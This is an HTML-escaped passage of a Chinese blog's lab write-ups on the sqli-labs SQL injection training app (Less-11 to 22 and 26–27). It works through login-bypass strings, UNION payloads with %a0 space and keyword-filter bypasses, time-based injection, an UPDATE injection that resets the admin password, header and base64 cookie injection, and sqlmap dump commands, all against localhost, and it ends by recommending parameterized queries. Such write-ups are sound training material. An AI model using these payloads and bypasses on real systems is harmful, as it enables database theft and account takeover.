+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">?id=0&amp;#39;%a0UNION%a0ALL%a0SELECT%a01,2,3%a0FROM%a0users%a0WHERE%a0&amp;#39;1&amp;#39;=&amp;#39;1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-4/image-20220512160235324.png"
+width="1080"
+height="410"
+srcset="https://weakptr.site/p/sqli-labs-training-4/image-20220512160235324_hu0c21c5b5c9baab5021bff6d0bb98bef9_37435_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-4/image-20220512160235324_hu0c21c5b5c9baab5021bff6d0bb98bef9_37435_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220512160235324"
+class="gallery-image"
+data-flex-grow="263"
+data-flex-basis="632px"
+>&lt;/p>
+&lt;p>注入成功。&lt;/p>
+&lt;p>另外补充一下关于 AND OR 的绕过方法，使用 &lt;code>preg_replace&lt;/code> 替换的话双写就无法绕过了，但还可以考虑用逻辑运算，&lt;code>&amp;amp;&amp;amp;&lt;/code>、&lt;code>||&lt;/code>以及位运算&lt;code>|&lt;/code>、&lt;code>&amp;amp;&lt;/code>去组合条件，甚至是算数运算&lt;code>select * from users where (id=1)+(username='Dumb')=2;&lt;/code>。&lt;/p>
+&lt;p>以上就是空格和&lt;code>and&lt;/code>、&lt;code>or&lt;/code>过滤的绕过方法了。注释感觉没法绕，现在没思路，暂且不谈。&lt;/p>
+&lt;h2 id="less-27">Less-27&lt;/h2>
+&lt;p>提示 all your union and select belongs to us ，不能使用 union 注入。测试注入&lt;code>?id=1'&lt;/code>报错有回显，字符型注入。考虑限制了 select 查别的表会比较麻烦，先试试能不能绕过 &lt;code>?id=1' uniunionon seselectlect 1,2,3&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-4/image-20220512165506110.png"
+width="576"
+height="50"
+srcset="https://weakptr.site/p/sqli-labs-training-4/image-20220512165506110_hu3e8dab28ae6c757455369233587af676_3175_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-4/image-20220512165506110_hu3e8dab28ae6c757455369233587af676_3175_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220512165506110"
+class="gallery-image"
+data-flex-grow="1152"
+data-flex-basis="2764px"
+>&lt;/p>
+&lt;p>发现&lt;code>union&lt;/code>成功绕过，但&lt;code>select&lt;/code>没有幸免，同时发现空格也被过滤了。修改 payload &lt;code>?id=1'%a0uniunionon%a0SeselectLeCt%a01,2,3&lt;/code> 成功大小写绕过。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-4/image-20220512165641965.png"
+width="680"
+height="54"
+srcset="https://weakptr.site/p/sqli-labs-training-4/image-20220512165641965_hu6fd4d023623058a5158adbd868114adc_4749_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-4/image-20220512165641965_hu6fd4d023623058a5158adbd868114adc_4749_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220512165641965"
+class="gallery-image"
+data-flex-grow="1259"
+data-flex-basis="3022px"
+>&lt;/p>
+&lt;p>之后就是常规操作了 &lt;code>?id=0'%a0uniunionon%a0SeselectLeCt%a01,2,3%a0from%a0users%a0where%a0'a'='a&lt;/code>，成功。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-4/image-20220512165932026.png"
+width="1100"
+height="398"
+srcset="https://weakptr.site/p/sqli-labs-training-4/image-20220512165932026_huf400eb849f98557666dff2e60091d86c_37107_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-4/image-20220512165932026_huf400eb849f98557666dff2e60091d86c_37107_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220512165932026"
+class="gallery-image"
+data-flex-grow="276"
+data-flex-basis="663px"
+>&lt;/p>
+&lt;h2 id="总结">总结&lt;/h2>
+&lt;p>page-2 难度果然比 page-1 大很多，今天只做出来5道题，每题都要想一会儿查查资料。&lt;/p>
+&lt;p>几个意识到的知识点：&lt;/p>
+&lt;ol>
+&lt;li>直接拼接某些函数有问题，或者拼子查询有问题，可以考虑下用&lt;code>select 123 from (select ...)&lt;/code>包装一下说不定能省很多事。&lt;/li>
+&lt;li>second-order injection 的概念，用户输入可能过滤很好，但另一个地方用的时候没过滤，也会造成注入。&lt;/li>
+&lt;li>几种绕过过滤的方法
+&lt;ol>
+&lt;li>对&lt;code>and&lt;/code>、&lt;code>or&lt;/code>用运算符替代的方式绕过。但有经验的开发会屏蔽掉&lt;code>|&amp;amp;;$&lt;/code>之类的特殊字符，不一定好绕。&lt;/li>
+&lt;li>对空格过滤的绕过，&lt;code>latin1&lt;/code>编码的空格&lt;code>0xa0&lt;/code>。一般开发不容易注意到&lt;code>0xa0&lt;/code>能绕过&lt;code>\s&lt;/code>正则。&lt;/li>
+&lt;li>一般关键词用双写、大小写方式绕过，但不一定绕得过去，被禁用的情况下可以考虑下换别的方式。&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;/ol>
+&lt;p>再补充下如何安全开发。其实很简单，用 parameterized query 或者说 prepared statement/query 。目前是最有效的防 SQL 注入的方法，彻底摆脱了上面的过滤、转义等传统攻防对抗，web App 开发者可以从 SQL 注入漏洞的无底深渊里解放出来。&lt;/p>
+&lt;p>遗憾的是我随便翻了下 github 上的一些新 CMS，虽然有各种 ORM 可以用，现代 DBMS 也早支持了 parameterized query，但还有人在手动拼 SQL =。= 理由就不乱推测了。Go 的 sql 库还是很给力的，直接把 parameterized query 作为最佳实践了，就是还顶不住依然有人在拼字符串=。= 我也是大无语。&lt;/p>
+&lt;p>那就到这里结束了，辛苦我自己啦！&lt;/p></description></item><item><title>sqli-labs 实验记录 #3</title><link>https://weakptr.site/p/sqli-labs-training-3/</link><pubDate>Wed, 11 May 2022 16:36:31 +0800</pubDate><guid>https://weakptr.site/p/sqli-labs-training-3/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
+&lt;p>从 sqli-labs 第 11 题开始。后续注入点不再是 query string，还是先拿 sqlmap 解决。题目数量很多区别较小，所以重复的思路可能就略了。&lt;/p>
+&lt;h2 id="less-11">Less-11&lt;/h2>
+&lt;p>Error Based 而且注入点是 POST 表单。用&lt;code>'&lt;/code>确认&lt;code>password&lt;/code>字段也有注入后，尝试手工 bypass 验证：&lt;code>' or 1=1;--&lt;/code> 注意注释符后跟一个空格，但不能在输入框写 &lt;code>%20&lt;/code>，会被转义成&lt;code>%%20&lt;/code>。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-3/image-20220511113730087.png"
+width="802"
+height="572"
+srcset="https://weakptr.site/p/sqli-labs-training-3/image-20220511113730087_hu4bd98b42bdbe57e685502990a5a5bcab_159599_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-3/image-20220511113730087_hu4bd98b42bdbe57e685502990a5a5bcab_159599_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220511113730087"
+class="gallery-image"
+data-flex-grow="140"
+data-flex-basis="336px"
+>&lt;/p>
+&lt;h2 id="less-12">Less-12&lt;/h2>
+&lt;p>用&lt;code>&amp;quot;&lt;/code>测出引号类型后根据报错内容补一个右括号，最终 payload &lt;code>&amp;quot;) or 1=1;--&lt;/code> 注意空格。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-3/image-20220511113913798.png"
+width="784"
+height="530"
+srcset="https://weakptr.site/p/sqli-labs-training-3/image-20220511113913798_hu1e88a9f782066603a0a6fb459a4f17e3_159074_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-3/image-20220511113913798_hu1e88a9f782066603a0a6fb459a4f17e3_159074_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220511113913798"
+class="gallery-image"
+data-flex-grow="147"
+data-flex-basis="355px"
+>&lt;/p>
+&lt;h2 id="less-13">Less-13&lt;/h2>
+&lt;p>有报错，提示 double injection 。用&lt;code>'&lt;/code>测出引号类型，根据错误信息补右括号，&lt;code>') or 1=1;--&lt;/code> bypass 成功。&lt;/p>
+&lt;p>也可以用上一篇博客提到的&lt;code>rand&lt;/code>+&lt;code>group by&lt;/code>报错的方式。但我是真的越来越不懂 double injection 到底是不是特指某种注入技巧了，还是说就没共识大家对 double injection 各自解释？&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-3/image-20220511114447196.png"
+width="773"
+height="515"
+srcset="https://weakptr.site/p/sqli-labs-training-3/image-20220511114447196_hucf43289805919decf00eb1fd7c21b49d_157237_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-3/image-20220511114447196_hucf43289805919decf00eb1fd7c21b49d_157237_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220511114447196"
+class="gallery-image"
+data-flex-grow="150"
+data-flex-basis="360px"
+>&lt;/p>
+&lt;h2 id="less-14">Less-14&lt;/h2>
+&lt;p>用&lt;code>&amp;quot;&lt;/code>测出引号类型，根据报错不用补右括号，&lt;code>&amp;quot; or 1=1;--&lt;/code> bypass 成功。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-3/image-20220511114639716.png"
+width="851"
+height="561"
+srcset="https://weakptr.site/p/sqli-labs-training-3/image-20220511114639716_hu4f41a74d132e4ef993bbd4055861bbbd_158192_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-3/image-20220511114639716_hu4f41a74d132e4ef993bbd4055861bbbd_158192_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220511114639716"
+class="gallery-image"
+data-flex-grow="151"
+data-flex-basis="364px"
+>&lt;/p>
+&lt;h2 id="less-15">Less-15&lt;/h2>
+&lt;p>布尔盲注，测试&lt;code>'&lt;/code>报错，&lt;code>' or 1=1;--&lt;/code> bypass 成功。&lt;/p>
+&lt;p>图就略了。&lt;/p>
+&lt;h2 id="less-16">Less-16&lt;/h2>
+&lt;p>时间盲注，测试&lt;code>&amp;quot;&lt;/code>报错，&lt;code>&amp;quot; or sleep(1);--&lt;/code>无效，补右括号，&lt;code>&amp;quot;) or sleep(1);--&lt;/code> 有效。&lt;/p>
+&lt;h2 id="less-17">Less-17&lt;/h2>
+&lt;p>这次的表单是更新密码，表单内容用户名和新密码，没有错误回显。&lt;/p>
+&lt;p>提示 update 注入。update 注入的 SQL 格式化参数的位置一般在 &lt;code>UPDATE tbl SET col=input col2=input ... WHERE ...&lt;/code> &lt;code>SET&lt;/code> 后面和 &lt;code>WHERE&lt;/code> 后面。这里显然 &lt;code>WHERE&lt;/code> 后面的是用户名 &lt;code>SET&lt;/code> 后面的是新密码。因为没有明确的目标，越权把 admin 用户的密码改了拉倒。&lt;/p>
+&lt;p>先确认注入类型，尝试 &lt;code>admin';-- &lt;/code>、&lt;code>admin');-- &lt;/code>、&lt;code>admin&amp;quot;;-- &lt;/code>、&lt;code>admin&amp;quot;);-- &lt;/code>、&lt;code>admin'));--&lt;/code>、&lt;code>admin&amp;quot;));--&lt;/code>都无效。这就有点气人了。&lt;/p>
+&lt;p>再试试密码能不能注入，&lt;code>password';--&lt;/code>，直接把后面的&lt;code>where&lt;/code>全注释掉。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-3/image-20220511144727654.png"
+width="841"
+height="562"
+srcset="https://weakptr.site/p/sqli-labs-training-3/image-20220511144727654_hufa25563151eb039af331c645b7a1808f_251245_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-3/image-20220511144727654_hufa25563151eb039af331c645b7a1808f_251245_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220511144727654"
+class="gallery-image"
+data-flex-grow="149"
+data-flex-basis="359px"
+>&lt;/p>
+&lt;p>直连 MySQL 验证确认注入生效。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-3/image-20220511144801988.png"
+width="476"
+height="378"
+srcset="https://weakptr.site/p/sqli-labs-training-3/image-20220511144801988_hu5fdde7b43b72f56a9f1f2b3c90b53817_165388_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-3/image-20220511144801988_hu5fdde7b43b72f56a9f1f2b3c90b53817_165388_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220511144801988"
+class="gallery-image"
+data-flex-grow="125"
+data-flex-basis="302px"
+>&lt;/p>
+&lt;p>另外也可以用 error based 方式在密码这里注入，爆出 admin 的密码，子查询就行。&lt;/p>
+&lt;h2 id="less-18">Less-18&lt;/h2>
+&lt;p>提示 Header Injection，尝试正常密码登陆 &lt;code>admin&lt;/code>、&lt;code>password&lt;/code> 成功。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-3/image-20220511145044686.png"
+width="1326"
+height="455"
+srcset="https://weakptr.site/p/sqli-labs-training-3/image-20220511145044686_hu40d444a12dac525d8bc65febeb216a4e_167436_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-3/image-20220511145044686_hu40d444a12dac525d8bc65febeb216a4e_167436_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220511145044686"
+class="gallery-image"
+data-flex-grow="291"
+data-flex-basis="699px"
+>&lt;/p>
+&lt;p>界面上分别是 IP 地址和 UA，没有更多提示，也没找到自定义 HTTP 头，所以初步怀疑注入点是在 UA 里。可以选择用 httpie 或者 curl 发个请求测试。我用 httpie 试下。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">http --form POST &lt;span class="s1">&amp;#39;http://localhost/Less-18/&amp;#39;&lt;/span> &lt;span class="nv">uname&lt;/span>&lt;span class="o">=&lt;/span>admin &lt;span class="nv">passwd&lt;/span>&lt;span class="o">=&lt;/span>password &lt;span class="nv">submit&lt;/span>&lt;span class="o">=&lt;/span>Submit &lt;span class="s2">&amp;#34;User-Agent:sqli/1.0&amp;#39;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>返回&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">font&lt;/span> &lt;span class="na">color&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;#0000ff&amp;#34;&lt;/span> &lt;span class="na">font&lt;/span> &lt;span class="na">size &lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="s">3&lt;/span> &lt;span class="p">&amp;gt;&lt;/span>Your User Agent is: sqli/1.0&amp;#39;&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">font&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#39;172.19.0.1&amp;#39;, &amp;#39;admin&amp;#39;)&amp;#39; at line 1&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>确认存在注入。剩下的事情就很简单了，写个 req.txt 用 &lt;code>sqlmap -r req.txt -p User-Agent -T users --dump&lt;/code>爆出用户名密码。&lt;/p>
+&lt;h2 id="less-19">Less-19&lt;/h2>
+&lt;p>依然是 Header Injection，提示 &lt;code>Your Referer is ...&lt;/code>，注入点应该在 &lt;code>Referer&lt;/code> 里，直接把 Less-18 的命令稍微改下。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">http --form POST &lt;span class="s1">&amp;#39;http://localhost/Less-19/&amp;#39;&lt;/span> &lt;span class="nv">uname&lt;/span>&lt;span class="o">=&lt;/span>admin &lt;span class="nv">passwd&lt;/span>&lt;span class="o">=&lt;/span>password &lt;span class="nv">submit&lt;/span>&lt;span class="o">=&lt;/span>Submit &lt;span class="s2">&amp;#34;Referer:http://im.hacker/&amp;#39;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>返回&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Your IP ADDRESS is: 172.19.0.1&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">font&lt;/span> &lt;span class="na">color&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;#FFFF00&amp;#34;&lt;/span> &lt;span class="na">font&lt;/span> &lt;span class="na">size &lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="s">3&lt;/span> &lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">font&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">font&lt;/span> &lt;span class="na">color&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;#0000ff&amp;#34;&lt;/span> &lt;span class="na">font&lt;/span> &lt;span class="na">size &lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="s">3&lt;/span> &lt;span class="p">&amp;gt;&lt;/span>Your Referer is: http://im.hacker/&amp;#39;&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">font&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#39;172.19.0.1&amp;#39;)&amp;#39; at line 1&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">img&lt;/span> &lt;span class="na">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;../images/flag.jpg&amp;#34;&lt;/span> &lt;span class="p">/&amp;gt;&amp;lt;&lt;/span>&lt;span class="nt">br&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>确认注入ok，接着用 sqlmap 就行。&lt;/p>
+&lt;h2 id="less-20">Less-20&lt;/h2>
+&lt;p>提示 Cookie Injection，但是无论登陆成功失败都没有设置 Cookie。尝试随便设置一个 cookie &lt;code>id=...&lt;/code>，再刷新页面，并无效果，于是开始怀疑是不是说的 &lt;code>PHPSESSID&lt;/code>，再次尝试&lt;code>PHPSESSID=1'&amp;quot;&lt;/code>，依然没有作用。发愁。&lt;/p>
+&lt;p>看了眼 Less-20 的源码，发现代码里明确写了 &lt;code>!isset($_COOKIE['uname'])&lt;/code>，再试一次&lt;code>uname=admin'&lt;/code>。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-3/image-20220511153246874.png"
+width="1034"
+height="484"
+srcset="https://weakptr.site/p/sqli-labs-training-3/image-20220511153246874_hu2f31f2a7d2b8d032615a7d3377928641_25660_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-3/image-20220511153246874_hu2f31f2a7d2b8d032615a7d3377928641_25660_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220511153246874"
+class="gallery-image"
+data-flex-grow="213"
+data-flex-basis="512px"
+>&lt;/p>
+&lt;p>有效果，问题变成了如何完成注入。审阅源码得知只有满足 &lt;code>isset($_COOKIE['uname'])&lt;/code> 和 &lt;code>!isset($_POST['submit'])&lt;/code> 的情况下才会进入带查询的分支。所以只需要在这个页面不用&lt;code>ctrl+r&lt;/code>（因为会重新POST表单），点地址栏再回车就进入了带查询的页面。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-3/image-20220511160609383.png"
+width="1756"
+height="299"
+srcset="https://weakptr.site/p/sqli-labs-training-3/image-20220511160609383_hu5abf0d1e914b80362d218ae596ff943f_230809_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-3/image-20220511160609383_hu5abf0d1e914b80362d218ae596ff943f_230809_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220511160609383"
+class="gallery-image"
+data-flex-grow="587"
+data-flex-basis="1409px"
+>&lt;/p>
+&lt;p>可以看到下方有MySQL的错误信息，接下来只需要用 sqlmap 或者手工构造个 error based 爆破即可。&lt;/p>
+&lt;h2 id="less-21">Less-21&lt;/h2>
+&lt;p>依然是 Cookie 注入，但是是 &lt;code>complex&lt;/code> 版本，我倒要看看有多复杂。直接上 Less-20 的 &lt;code>uname=admin'&lt;/code>。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-3/image-20220511161052493.png"
+width="1826"
+height="456"
+srcset="https://weakptr.site/p/sqli-labs-training-3/image-20220511161052493_hu61dd0aa5ba2f1e5b56487313df680442_279311_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-3/image-20220511161052493_hu61dd0aa5ba2f1e5b56487313df680442_279311_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220511161052493"
+class="gallery-image"
+data-flex-grow="400"
+data-flex-basis="961px"
+>&lt;/p>
+&lt;p>注意有个特殊的错误信息。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Issue with your mysql: Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (latin1_swedish_ci,COERCIBLE) for operation &amp;#39;=&amp;#39;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>谷歌搜索可知这是因为查询的字符集有差异，尝试比较&lt;code>gbk_chinese_ci&lt;/code>和&lt;code>latin1&lt;/code>。这里我们了解下&lt;code>gbk&lt;/code>是宽字符集，定长 2 字节，而 &lt;code>latin1&lt;/code> 是一个极为特殊的字符集，&lt;code>ascii&lt;/code>包括了&lt;code>u+0001~u+0080&lt;/code>，&lt;code>latin1&lt;/code>正好包括了&lt;code>u+0080~u+00ff&lt;/code>，也就是单字节除了&lt;code>0x00&lt;/code>外全部都可以解释成 &lt;code>ascii&lt;/code> 和 &lt;code>latin1&lt;/code> 而不出现编码错误，经常被当成默认字符编码。&lt;/p>
+&lt;p>回到正题，测试中发现&lt;code>'&lt;/code>没有报错，所以继续尝试&lt;code>&amp;quot;&lt;/code>，依然没报错，问题变得奇怪起来了。直接开始审阅代码。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-3/image-20220511162312174.png"
+width="762"
+height="92"
+srcset="https://weakptr.site/p/sqli-labs-training-3/image-20220511162312174_hu4ef0d4381ebf42bd569d9e59e2965081_14037_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-3/image-20220511162312174_hu4ef0d4381ebf42bd569d9e59e2965081_14037_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220511162312174"
+class="gallery-image"
+data-flex-grow="828"
+data-flex-basis="1987px"
+>&lt;/p>
+&lt;p>发现有个 &lt;code>base64_decode&lt;/code>，把 &lt;code>payload&lt;/code> 编码一下：&lt;code>YWRtaW4nCg&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-3/image-20220511162411345.png"
+width="1826"
+height="339"
+srcset="https://weakptr.site/p/sqli-labs-training-3/image-20220511162411345_hud870b9a61a73ac91f63091af877b397d_90354_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-3/image-20220511162411345_hud870b9a61a73ac91f63091af877b397d_90354_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220511162411345"
+class="gallery-image"
+data-flex-grow="538"
+data-flex-basis="1292px"
+>&lt;/p>
+&lt;p>报错成功。接下来手工构造一个 error based 注入或者 sqlmap 加上 base64 tamper 即可。&lt;/p>
+&lt;h2 id="less-22">Less-22&lt;/h2>
+&lt;p>21和22两题都没法从前端得到太多信息，还是直接看代码。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-3/image-20220511163010736.png"
+width="810"
+height="138"
+srcset="https://weakptr.site/p/sqli-labs-training-3/image-20220511163010736_hu07dac01f7d23a8aa7d3161316428c4c9_21977_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-3/image-20220511163010736_hu07dac01f7d23a8aa7d3161316428c4c9_21977_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220511163010736"
+class="gallery-image"
+data-flex-grow="586"
+data-flex-basis="1408px"
+>&lt;/p>
+&lt;p>一个 &lt;code>base64_decode&lt;/code> 加上 &lt;code>&amp;quot;&amp;quot;&lt;/code> 连接，我们编码一下 payload：&lt;code>YWRtaW4iCg&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-3/image-20220511163108492.png"
+width="1737"
+height="422"
+srcset="https://weakptr.site/p/sqli-labs-training-3/image-20220511163108492_hu50d70535ba4af8130891cc1d181a8148_280079_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-3/image-20220511163108492_hu50d70535ba4af8130891cc1d181a8148_280079_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220511163108492"
+class="gallery-image"
+data-flex-grow="411"
+data-flex-basis="987px"
+>&lt;/p>
+&lt;p>报错成功，接下来手工构造 error based 注入或者 sqlmap 都行，不重复了。&lt;/p>
+&lt;h2 id="总结">总结&lt;/h2>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-3/image.png"
+width="1140"
+height="1038"
+srcset="https://weakptr.site/p/sqli-labs-training-3/image_hu15bdcbb5037c607898701ef384a9ee2b_81003_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-3/image_hu15bdcbb5037c607898701ef384a9ee2b_81003_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="sqli-labs page-1"
+class="gallery-image"
+data-flex-grow="109"
+data-flex-basis="263px"
+>&lt;/p>
+&lt;p>至此，整个 sqli-labs page-1 的所有题目就都做完了。&lt;/p>
+&lt;p>自我感觉 sqli 的基础应该是掌握差不多了，也有了信心和耐心。考虑接下来是做 page-2 还是找 xss-labs ，打打 xss 的基础。或者一起来也行，预计 page-2 可能会稍难点，大概，做不过就试试 xss-labs。&lt;/p></description></item><item><title>sqli-labs 实验记录 #2</title><link>https://weakptr.site/p/sqli-labs-training-2/</link><pubDate>Tue, 10 May 2022 15:14:45 +0800</pubDate><guid>https://weakptr.site/p/sqli-labs-training-2/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
+&lt;p>开始 sqli-labs 的第二轮训练。&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>!!!ATTENTION!!!&lt;/strong>&lt;/p>
+&lt;p>在 MySQL 5.7.36 更新中，修复了 group by 报错 &lt;code>Duplicate entry '0' for key '&amp;lt;group_key&amp;gt;'&lt;/code> 的问题。&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;a class="link" href="https://dev.mysql.com/doc/relnotes/mysql/5.7/en/news-5-7-36.html" target="_blank" rel="noopener"
+>Changes in MySQL 5.7.36 (2021-10-19, General Availability)&lt;/a>&lt;/p>
